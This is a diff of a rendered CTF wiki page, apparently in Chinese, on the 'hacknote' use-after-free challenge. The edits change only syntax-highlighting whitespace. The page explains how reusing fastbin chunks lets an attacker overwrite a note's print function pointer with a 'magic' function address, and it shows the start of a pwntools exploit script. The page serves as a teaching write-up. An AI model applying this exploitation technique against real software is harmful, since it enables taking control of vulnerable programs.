@@ -137,12 +137,12 @@ this<span class=w> </span>pogram<span class=w> </span>will<span class=w> </span>
 </code></pre></div> </li> </ol> <p>那麼，根據我們之前在堆的實現中所學到的，顯然note是一個fastbin chunk（大小爲16字節）。我們的目的是希望一個note的put字段爲magic的函數地址，那麼我們必須想辦法讓某個note的printnote指針被覆蓋爲magic地址。由於程序中只有唯一的地方對printnote進行賦值。所以我們必須利用寫real content的時候來進行覆蓋。具體採用的思路如下</p> <ul> <li>申請note0，real content size爲16（大小與note大小所在的bin不一樣即可）</li> <li>申請note1，real content size爲16（大小與note大小所在的bin不一樣即可）</li> <li>釋放note0</li> <li>釋放note1</li> <li>此時，大小爲16的fast bin chunk中鏈表爲note1-&gt;note0</li> <li>申請note2，並且設置real content的大小爲8，那麼根據堆的分配規則</li> <li>note2其實會分配note1對應的內存塊。</li> <li>real content 對應的chunk其實是note0。</li> <li>如果我們這時候向note2 real content的chunk部分寫入magic的地址，那麼由於我們沒有note0爲NULL。當我們再次嘗試輸出note0的時候，程序就會調用magic函數。</li> </ul> <h3 id=_5>利用腳本<a class=headerlink href=#_5 title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code><span class=ch>#!/usr/bin/env python</span>
 <span class=c1># -*- coding: utf-8 -*-</span>
 
-<span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+<span class=kn>from</span><span class=w> </span><span class=nn>pwn</span><span class=w> </span><span class=kn>import</span> <span class=o>*</span>
 
 <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=s1>&#39;./hacknote&#39;</span><span class=p>)</span>
 
 
-<span class=k>def</span> <span class=nf>addnote</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>addnote</span><span class=p>(</span><span class=n>size</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
     <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&quot;:&quot;</span><span class=p>)</span>
     <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&quot;1&quot;</span><span class=p>)</span>
     <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&quot;:&quot;</span><span class=p>)</span>
@@ -151,14 +151,14 @@ this<span class=w> </span>pogram<span class=w> </span>will<span class=w> </span>
     <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>content</span><span class=p>)</span>
 
 
-<span class=k>def</span> <span class=nf>delnote</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>delnote</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
     <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&quot;:&quot;</span><span class=p>)</span>
     <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&quot;2&quot;</span><span class=p>)</span>
     <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&quot;:&quot;</span><span class=p>)</span>
     <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
 
 
-<span class=k>def</span> <span class=nf>printnote</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
+<span class=k>def</span><span class=w> </span><span class=nf>printnote</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
     <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&quot;:&quot;</span><span class=p>)</span>
     <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&quot;3&quot;</span><span class=p>)</span>
     <span class=n>r</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&quot;:&quot;</span><span class=p>)</span>
